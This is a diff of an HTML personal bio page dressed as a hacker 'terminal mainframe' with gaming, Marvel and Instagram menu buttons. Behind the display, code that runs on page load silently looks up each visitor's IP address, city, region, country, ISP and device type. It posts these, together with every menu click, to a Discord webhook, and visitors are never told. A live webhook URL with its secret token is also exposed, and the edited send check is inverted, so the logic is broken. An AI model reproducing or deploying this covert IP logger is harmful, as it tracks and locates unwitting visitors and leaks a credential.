@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Terminal Session</title>
+    <title>Sajid | Terminal Mainframe</title>
     <style>
         html, body { 
             height: 100%; 
@@ -15,74 +15,76 @@
         body { 
             color: #00ff33; 
             font-family: 'Courier New', Courier, monospace; 
-            padding: 15px; 
+            padding: 20px; 
             font-size: 14px; 
-            line-height: 1.5; 
+            line-height: 1.6; 
             overflow-x: hidden;
         }
-        .line { margin-bottom: 6px; white-space: pre-wrap; word-break: break-all; }
-        .input-container { display: inline-flex; align-items: center; gap: 10px; width: 100%; margin-top: 5px; }
-        input { 
-            background: transparent; 
-            border: none; 
-            color: #00ff33; 
-            font-family: inherit; 
-            font-size: inherit; 
-            outline: none; 
-            flex-grow: 1;
-            max-width: 180px;
-            caret-color: #00ff33; 
-            padding: 2px 0;
-            margin: 0;
-            border-bottom: 1px dashed #00ff33;
+        .line { margin-bottom: 8px; white-space: pre-wrap; word-break: break-all; }
+        .header-box { color: #ffffff; font-weight: bold; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
+        .accent-text { color: #00ffff; }
+        .btn-container { 
+            margin-top: 25px; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 12px; 
+            max-width: 280px; 
         }
-        .term-btn {
+        .menu-btn {
+            background: transparent;
+            color: #00ff33;
+            border: 1px solid #00ff33;
+            padding: 10px;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: bold;
+            text-align: left;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+            box-shadow: 0 0 4px rgba(0, 255, 51, 0.2);
+        }
+        .menu-btn:hover, .menu-btn:active {
             background-color: #00ff33;
             color: #050505;
-            border: none;
-            padding: 4px 10px;
-            font-family: inherit;
-            font-size: 12px;
-            font-weight: bold;
-            border-radius: 3px;
-            cursor: pointer;
-            text-transform: uppercase;
-            box-shadow: 0 0 5px rgba(0, 255, 51, 0.4);
+            box-shadow: 0 0 10px rgba(0, 255, 51, 0.6);
         }
-        .term-btn:active { background-color: #ffffff; color: #050505; }
-        .header-box { color: #ffffff; font-weight: bold; }
-        .tap-hint { color: #888888; font-style: italic; font-size: 12px; }
-        .timeout-text { color: #ff3333; font-weight: bold; }
+        #interactive-output {
+            margin-top: 20px;
+            padding: 10px;
+            border-left: 2px dashed #00ffff;
+            min-height: 40px;
+            display: none;
+        }
     </style>
 </head>
 <body>
-<div id="terminal"></div>
+
+<div id="mainframe"></div>
+<div id="interactive-output"></div>
 
 <script>
 // --- CONFIGURATION ---
 // ⚠️ PASTE YOUR DISCORD WEBHOOK URL INSIDE THE QUOTES BELOW
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542059603406356540/CCMUEg9CrtIVAa9b-fqm7nNtDkgP9bvOQSfy3l_A5qXaqAx2yGAh5xn1PqNluHpk8Th0"; 
-const TIMEOUT_DURATION = 5 * 60 * 1000; 
-const terminal = document.getElementById('terminal');
-let idleTimer;
-let inputElement;
-let submitBtnElement;
+const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
+const mainframe = document.getElementById('mainframe');
+const outputBox = document.getElementById('interactive-output');
 let totalVisits = "Fetching...";
 let geoDataString = "Fetching location details...";
 
-// --- SMART DEVICE & BOT DETECTOR ---
+// --- SMART DEVICE DETECTOR ---
 const userAgent = navigator.userAgent.toLowerCase();
-let deviceType = "📱 Mobile Device (Unknown Browser)";
+let deviceType = "📱 Mobile Device";
 
-if (userAgent.includes("facebookexternalhit") || userAgent.includes("meta-external") || userAgent.includes("bot") || userAgent.includes("spider") || userAgent.includes("crawl")) {
+if (userAgent.includes("facebookexternalhit") || userAgent.includes("meta-external") || userAgent.includes("bot") || userAgent.includes("spider")) {
     deviceType = "🚨 META CRAWLER / SECURITY BOT";
 } else if (userAgent.includes("instagram")) {
     deviceType = "📸 Instagram In-App Browser";
-} else if (userAgent.includes("iphone") || userAgent.includes("ipad") || userAgent.includes("ipod")) {
+} else if (userAgent.includes("iphone") || userAgent.includes("ipad")) {
     deviceType = "🍏 iPhone / iOS Device";
 } else if (userAgent.includes("android")) {
     deviceType = "🤖 Android Device";
-} else if (userAgent.includes("windows") || userAgent.includes("macintosh") || userAgent.includes("linux")) {
+} else if (userAgent.includes("windows") || userAgent.includes("macintosh")) {
     deviceType = "💻 Desktop PC / Laptop";
 }
 
@@ -90,96 +92,74 @@ function fetchHitCounter() {
     fetch("https://counterapi.dev")
     .then(response => response.json())
     .then(data => {
-        if(data && data.count) { totalVisits = data.count; }
+        if(data && data.count) { 
+            totalVisits = data.count;
+            document.getElementById('packet-count').textContent = totalVisits + " network packets";
+        }
     })
-    .catch(err => { totalVisits = "Dynamic Data Offline"; });
+    .catch(() => { totalVisits = "Active"; });
 }
 
-// --- NEW GEO-LOCATION TRACKER ---
+// --- FAST GEOLOCATION TRACKER ---
 function fetchLocationAndLog() {
-    fetch("https://ipapi.co")
+    fetch("https://ipwho.is")
     .then(res => res.json())
     .then(data => {
-        if (data && !data.error) {
-            geoDataString = `📍 **Location:** ${data.city}, ${data.region}, ${data.country_name}\n🌐 **IP Address:** ${data.ip}\n🏢 **ISP Network:** ${data.org}`;
+        if (data && data.success) {
+            geoDataString = `📍 **Location:** ${data.city}, ${data.region}, ${data.country}\n🌐 **IP Address:** ${data.ip}\n🏢 **ISP Network:** ${data.connection.isp}`;
         } else {
-            geoDataString = "❌ Location blocked or unavailable.";
+            geoDataString = "❌ Location profile hidden/unavailable.";
         }
-        // Send initial traffic alert with full device + city info right away
-        sendDiscordAlert("⚠️ Traffic Alert: Link Opened", "Visitor landed on terminal skin.");
+        sendDiscordAlert("🟢 Live Visitor Connected", "User is reading your main dashboard contents.");
     })
-    .catch(err => {
-        geoDataString = "⚠️ Location services timeout.";
-        sendDiscordAlert("⚠️ Traffic Alert: Link Opened", "Visitor landed on terminal skin.");
+    .catch(() => {
+        geoDataString = "⚠️ Network lookup restriction.";
+        sendDiscordAlert("🟢 Live Visitor Connected", "User is reading your main dashboard contents.");
     });
 }
 
-function initTerminal(isTimeout = false) {
-    terminal.innerHTML = ''; 
-    if (isTimeout) {
-        appendLine("[SYSTEM WARNING] Idle session terminated.", "timeout-text");
-        appendLine("[CRITICAL] Connection closed due to inactivity.\n");
-    }
-    
-    appendLine("⚙️ Initializing Secure Sandbox Connection...");
-    appendLine("✅ Decryption Handshake: SUCCESSFUL.");
+function printDashboard() {
+    appendLine("⚙️ Connecting to mohammadsajid116 Mainframe...", "accent-text");
+    appendLine("✅ Establishing secure layout wrapper... ONLINE.");
     appendLine("--------------------------------------------------");
-    appendLine("🔒 ACCESS RESTRICTED: PRIVATE SERVER PORTAL");
-    appendLine("💡 TIP: You don't have to use your real identity.");
+    appendLine("   ⚡ WELCOME TO SAJID'S DIGITAL SANDBOX ⚡", "header-box");
     appendLine("--------------------------------------------------");
-    
-    const promptLine = document.createElement('div');
-    promptLine.className = 'line';
-    promptLine.id = 'prompt-line';
-    promptLine.innerHTML = `
-        <span>Enter any Nickname to decrypt profile:</span>
-        <div class="input-container">
-            <input type="text" id="username" autocomplete="off" placeholder="guest_user">
-            <button id="submit-btn" class="term-btn">[DECRYPT]</button>
-        </div>
-    `;
-    terminal.appendChild(promptLine);
-    appendLine("(📲 Tap anywhere to open keyboard)", "tap-hint");
-    
-    inputElement = document.getElementById('username');
-    submitBtnElement = document.getElementById('submit-btn');
-    
-    inputElement.addEventListener('keydown', function(e) { if (e.key === 'Enter') processSelection(); });
-    submitBtnElement.addEventListener('click', function(e) { e.stopPropagation(); processSelection(); });
-}
+    appendLine("👤 PROFILE: SAJID");
+    appendLine("🚀 STATUS : Exploring new tech & building creative spaces.");
+    appendLine("📊 TRAFFIC: Processing entries across <span id='packet-count'>loading...</span>.");
+    appendLine("--------------------------------------------------");
+    appendLine("👉 Select a module below to inspect system details:", "accent-text");
 
-document.addEventListener('click', function(e) { if (inputElement && e.target !== submitBtnElement) inputElement.focus(); });
-document.addEventListener('touchstart', function(e) { if (inputElement && e.target !== submitBtnElement) inputElement.focus(); });
+    // Inject Interactive Menu Buttons
+    const btnContainer = document.createElement('div');
+    btnContainer.className = 'btn-container';
+    btnContainer.innerHTML = `
+        <button class="menu-btn" onclick="triggerModule('GAMES')">> [🎮] Current Gaming Loadout</button>
+        <button class="menu-btn" onclick="triggerModule('MARVEL')">> [🍿] Marvel Universe Logs</button>
+        <button class="menu-btn" onclick="triggerModule('INSTAGRAM')">> [💬] Open Secure DM Channel</button>
+    `;
+    mainframe.appendChild(btnContainer);
+}
 
 function appendLine(text, customClass = "") {
     const div = document.createElement('div');
     div.className = 'line ' + customClass;
-    div.textContent = text;
-    terminal.appendChild(div);
-    window.scrollTo(0, document.body.scrollHeight);
+    div.innerHTML = text;
+    mainframe.appendChild(div);
 }
-
-function startIdleTimer() {
-    clearTimeout(idleTimer);
-    idleTimer = setTimeout(() => { initTerminal(true); }, TIMEOUT_DURATION);
-}
-
-['click', 'touchstart', 'scroll', 'keydown'].forEach(evt => {
-    document.addEventListener(evt, () => { if (!document.getElementById('username')) startIdleTimer(); });
-});
 
 function sendDiscordAlert(eventTitle, detailValue) {
-    if (DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+    if (DISCORD_WEBHOOK_URL !== "https://discord.com/api/webhooks/1542059603406356540/CCMUEg9CrtIVAa9b-fqm7nNtDkgP9bvOQSfy3l_A5qXaqAx2yGAh5xn1PqNluHpk8Th0") {
         const isBot = deviceType.includes("CRAWLER");
         const payload = {
             embeds: [{
                 title: eventTitle,
-                color: isBot ? 16711680 : 65280, 
+                color: isBot ? 16711680 : 3342080, // Green for human interaction
                 fields: [
-                    { name: "Current Status", value: detailValue, inline: false },
-                    { name: "Device Info / Platform", value: deviceType, inline: false },
+                    { name: "Current Action", value: detailValue, inline: false },
+                    { name: "Platform / Device", value: deviceType, inline: false },
                     { name: "Network Telemetry Data", value: geoDataString, inline: false },
-                    { name: "Time Logged", value: new Date().toLocaleString(), inline: true }
+                    { name: "Timestamp", value: new Date().toLocaleString(), inline: true }
                 ]
             }]
         };
@@ -187,59 +167,36 @@ function sendDiscordAlert(eventTitle, detailValue) {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        }).catch(err => console.error("Telemetry error:", err));
+        }).catch(err => console.error(err));
     }
 }
 
-function processSelection() {
-    const name = inputElement.value.trim() || "Anonymous_Guest";
-    const hint = document.querySelector('.tap-hint');
-    if(hint) hint.remove();
+function triggerModule(moduleType) {
+    outputBox.style.display = "block";
+    outputBox.style.color = "#00ffff";
     
-    document.getElementById('prompt-line').innerHTML = `Decryption Cipher Completed. Code: Verified.`;
-    
-    // Send final identity alert when button is pressed
-    sendDiscordAlert("👤 Verification Completed", `User logged in as username: **${name}**`);
-    
-    setTimeout(() => { showBio(name); }, 600);
-}
-
-function showBio(visitorName) {
-    const bioLines = [
-        `\n[SYSTEM] Access granted. Hello, ${visitorName}!`,
-        "[SYSTEM] Loading profile details into system mainframe...",
-        "==================================================",
-        "          W E L C O M E  T O  M Y  B I O",
-        "==================================================",
-        " 👉 USERNAME: SAJID",
-        "==================================================",
-        "ABOUT ME: Just a guy navigating through new things.",
-        "LIKES: Video games and Marvel comics.",
-        "CURRENTLY: Exploring new tech and building cool spaces.",
-        "--------------------------------------------------",
-        "TRAFFIC: " + totalVisits + " total packets processed.",
-        "STATUS: Catch me on Instagram DMs if you want to chat.",
-        "\nsession_closed_bye@instagram_bio:~$"
-    ];
-    let delay = 0;
-    bioLines.forEach(text => {
+    if (moduleType === 'GAMES') {
+        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Currently playing story-driven open-world titles, high-octane racing sims, and multiplayer strategies!`;
+        sendDiscordAlert("🎯 Menu Interaction", "Visitor expanded the **[🎮 Gaming Loadout]** module.");
+    } 
+    else if (moduleType === 'MARVEL') {
+        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Massive Marvel comics fan. Hooked on deep timeline lore, variants, and MCU cinematic universes.`;
+        sendDiscordAlert("🎯 Menu Interaction", "Visitor expanded the **[🍿 Marvel Logs]** module.");
+    } 
+    else if (moduleType === 'INSTAGRAM') {
+        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Redirecting secure pipeline to Instagram DMs...`;
+        sendDiscordAlert("🚀 External Exit Redirect", "Visitor clicked the link to **[💬 Open DM Channel]**!");
         setTimeout(() => {
-            const div = document.createElement('div');
-            div.className = 'line';
-            if (text.includes("W E L C O M E") || text.includes("USERNAME:")) { div.className = 'line header-box'; }
-            div.textContent = text;
-            terminal.appendChild(div);
-            window.scrollTo(0, document.body.scrollHeight);
-        }, delay);
-        delay += 250;
-    });
-    startIdleTimer();
+            window.location.href = "https://instagram.com";
+        }, 1000);
+    }
+    window.scrollTo(0, document.body.scrollHeight);
 }
 
 window.onload = () => { 
+    printDashboard();
     fetchHitCounter(); 
-    initTerminal(false); 
-    fetchLocationAndLog(); // Triggers the tracking pipeline
+    fetchLocationAndLog(); 
 };
 </script>
 </body>
